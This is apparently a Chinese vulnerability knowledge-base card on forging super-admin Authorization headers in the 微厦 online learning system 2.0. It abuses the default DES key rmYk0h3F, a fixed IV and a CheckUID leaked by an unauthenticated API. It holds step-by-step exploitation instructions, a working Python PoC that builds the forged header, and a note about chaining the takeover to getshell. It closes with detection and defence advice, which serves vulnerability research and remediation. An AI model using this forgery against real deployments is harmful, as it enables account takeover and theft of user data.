---
id: web-generic-auth-dotnet-des-checkcode-authorization-forgery
title: .NET 学习系统 Authorization 伪造：泄露的 CheckUID + Web.config 默认 DES 密钥构造 Acc_Pw 接管超管
type: scenario
domain: web
path: web/generic/auth
technique: dotnet-des-checkcode-authorization-token-forgery
aliases:
- 微厦 Authorization 伪造
- Acc_Pw 生成逻辑
- CheckUID DES-CBC
- 校验码 base64 路径:emp
- 默认 Secretkey rmYk0h3F
tags:
- web
- auth
- dotnet
- des
- cbc
- static-key
- token-forgery
- account-takeover
- checkcode
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 微厦在线学习考试系统 2.0
verification:
  verified_by: verifier-V262
  verified_at: '2026-11-07T17:49:59+08:00'
  notes: V262 重核：对照正文与24图，Authorization=Basic base64(路径:emp+Acc_Pw)、Admin.cs LoginSuper/Login、LoginAdmin 生成 uid=UniqueID 存库并 _generate_checkcode、Web.config Secretkey rmYk0h3F/KeyName emp/Expires 600、ILSpy IV {18,52,86,120,144,171,205,239}/补12345678、DES 解密示例 emp,1,admin,2025-05-25 08:30:03,0ffdd... 与 POST /api/v2/Admin/Super 伪造成功、4012 条账号均一致；低版本无 emp 已注明。dup-scan pair6 保留两卡。affected_versions 微厦 2.0。
---

## 一句话结论

微厦学习系统的后台 `Authorization` 是 `Basic base64("{入口路径}:emp{Acc_Pw}")`，而 `Acc_Pw = DES-CBC("{keyname},{accid},admin,{过期时间},{uid}", key, IV)`，其中 `key` 默认取自 `Web.config` 的 `rmYk0h3F`、`IV` 固定为 `1234567890abcdef`、`uid` 就是员工接口泄露的 `Acc_CheckUID`；拿到目标的 CheckUID 后即可离线构造任意管理员的 `Acc_Pw` 并伪造请求头，直接以超级管理员身份进入后台。

## 原理

- **登录令牌生成**：管理员 `LoginSuper` 校验账号密码后进入 `LoginAdmin.Login(acc)`，先生成随机 `uid = Weisha.Core.Request.UniqueID()` 写入数据库（即 `Acc_CheckUID`），再调用 `_generate_checkcode(accid, uid)`：

```csharp
// 校验码,依次为：标识,id,角色,时效,识别码
string checkcode = "{0},{1},{2},{3},{4}";
string role = "admin";
checkcode = string.Format(checkcode, keyname, accid, role,
                          exp.ToString("yyyy-MM-dd HH:mm:ss"), uid);
checkcode = WeiSha.Core.DataConvert.EncryptForDES(checkcode, secretkey);
return checkcode;   // 即 Acc_Pw
```

  `keyname`/`secretkey`/`Expires` 来自 `Web.config` 的 `<Login><Admin>`：默认 `KeyName=emp`、`Secretkey=rmYk0h3F`、`Expires=600`（分钟）。
- **加密实现**：`WeiSha.Core.DataConvert.EncryptForDES` 使用 `DESCryptoServiceProvider`，`rgbIV = {18,52,86,120,144,171,205,239}`（即十六进制 `1234567890abcdef`），默认 CBC + PKCS7；密钥长度不足 8 字节补 `"12345678"`、超过截断。DES 是对称加密，知道 key/IV 即可加密，也能解密。
- **为什么可伪造**：
  1. 密钥与 IV 是产品默认值，写在 `Web.config` 且未强制修改；源码/部署包可直接读到。
  2. 校验码字段（keyname、accid、role、过期时间、uid）全部可预测/可控制，role 固定为 `admin`，过期时间由攻击者取未来值。
  3. 唯一需要保密的 `uid`（CheckUID）会通过未授权员工接口返回给前端（见关联卡），等于把令牌的最后一个未知量也交出去。
  4. 令牌没有 HMAC/签名或服务器端随机会话绑定，服务端只是解密后信任其中的字段；因此“知道 key + uid”即可无限伪造，无需知道密码。
- **请求头格式**：新版本为 `Authorization: Basic base64("{路径}:{keyname}{Acc_Pw}")`，如 `/manage:emp<Acc_Pw>`；低版本没有 `emp`，为 `base64("{路径}:{Acc_Pw}")`。`/manage` 对应超级管理员入口，`/orgadmin` 对应机构管理员；普通用户则走 `Account.cs`，使用另一套 key（默认 `a4h5ykLw`）与 `acc` 前缀。

## 触发条件

- 目标使用微厦在线学习考试系统，且 `Web.config` 中 `Login/Admin` 的 `Secretkey` 仍为默认 `rmYk0h3F`（或攻击者通过源码/配置泄露拿到实际 key），`KeyName=emp`、`Expires` 可预测。
- 攻击者已获得目标管理员的 `Acc_Id` 与 `Acc_CheckUID`（如通过 `/api/v2/Position/Employees` 未授权接口）。
- 后台入口路径（`/manage`、`/orgadmin` 等）可访问；服务端未校验令牌与 IP/UA/设备绑定。
- 令牌中的 `exp` 未过期；攻击者可自行填入未来时间。

## 利用步骤

1. 从未授权/越权接口获取目标管理员记录：`Acc_Id`（super 为 1）、`Acc_CheckUID`，并确认后台入口路径（如 `/manage`）。
2. 按原文格式拼接校验码：`emp,{accid},admin,{yyyy-MM-dd HH:mm:ss},{CheckUID}`；过期时间取未来（默认 600 分钟）。
3. 用 DES-CBC、key=`rmYk0h3F`、IV=`1234567890abcdef` 加密，PKCS7 填充，输出 Base64 即 `Acc_Pw`。
4. 拼接 `"{路径}:emp" + Acc_Pw` 再做一次 Base64，放在 `Authorization: Basic <结果>` 请求头。
5. 请求后台/接口（原文为 `POST /api/v2/Admin/Super`），响应返回 super 账号信息即伪造成功；刷新后台页面可进入管理界面，原文获取到 4012 条用户敏感信息。
6. 若要伪造普通用户，改用 `Account.cs` 的密钥/前缀与对应校验码字段；不同版本注意 `emp` 是否存在。

## PoC

```python
import base64, datetime
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

key = b"rmYk0h3F"                     # Web.config Login/Admin Secretkey 默认值
iv  = bytes.fromhex("1234567890abcdef")  # 固定 IV
uid = "0ffdd4f4d263eca78580811a9b032253" # 泄露的 Acc_CheckUID
accid, role, keyname = 1, "admin", "emp"
exp = (datetime.datetime.now() + datetime.timedelta(minutes=600)).strftime("%Y-%m-%d %H:%M:%S")

checkcode = f"{keyname},{accid},{role},{exp},{uid}"
acc_pw = base64.b64encode(DES.new(key, DES.MODE_CBC, iv).encrypt(pad(checkcode.encode(), 8))).decode()

auth = base64.b64encode(f"/manage:{keyname}{acc_pw}".encode()).decode()
print("Authorization: Basic " + auth)
```

原文用 DES 在线工具验证：解密 `HJ...op7cI5` 得到 `emp,1,admin,2025-05-25 08:30:03,0ffdd4f4d263eca78580811a9b032253`，与上述格式一致；随后携带伪造头请求 `/api/v2/Admin/Super` 成功返回 super 账号并进入后台（截图见原文）。

## 变体与关联

- 前置泄露：`web-generic-auth-unauth-position-employee-api-checkuid-leak`（未授权员工接口返回 Acc_Pw 与 CheckUID）。
- 普通用户令牌：`Song.ViewData/Methods/Account.cs` 与 `LoginAccount` 使用另一套 key/前缀（默认 `a4h5ykLw`、`acc`），格式略有差异，可同样伪造。
- 低版本差异：Authorization 中不带 `emp`，直接 `base64("{路径}:{Acc_Pw}")`；需按目标版本调整。
- 同类思路：硬编码密钥/固定 IV 的客户端或服务端令牌（JWT/自定义加密 Cookie），见 `web-generic-auth-client-nonce-weak-sha1-signature-forgery` 等；本卡的关键是“静态 DES + 可泄露随机量”。
- 组合链：伪造管理员 → 调用文件上传/后台功能 getshell（见同文章上传卡）。

## 检测与防御

- 立即修改 `Web.config` 中 `Login/Admin`、`Login/Accounts` 的 `Secretkey`，不要使用默认值；DES 密钥长度与随机性要足够，IV 必须随机且随令牌变化。
- 不要用“可预测字段 + 静态对称加密”做认证令牌；改用服务端随机会话 ID 或带 HMAC 签名、带过期与受众校验的 JWT，并绑定设备/IP。
- `Acc_CheckUID` 视为服务端机密，任何 API 都不得返回；数据库泄露时立即轮换。
- 服务端校验令牌时同时校验角色、账号状态、过期时间与签名，不能只解密后信任字段。
- 监控：Authorization 中出现 `base64` 后解码为 `路径:keyname` 结构、同一账号在异常 IP/短时间多次换 CheckUID、`/api/v2/Admin/Super` 等敏感接口的异常调用。
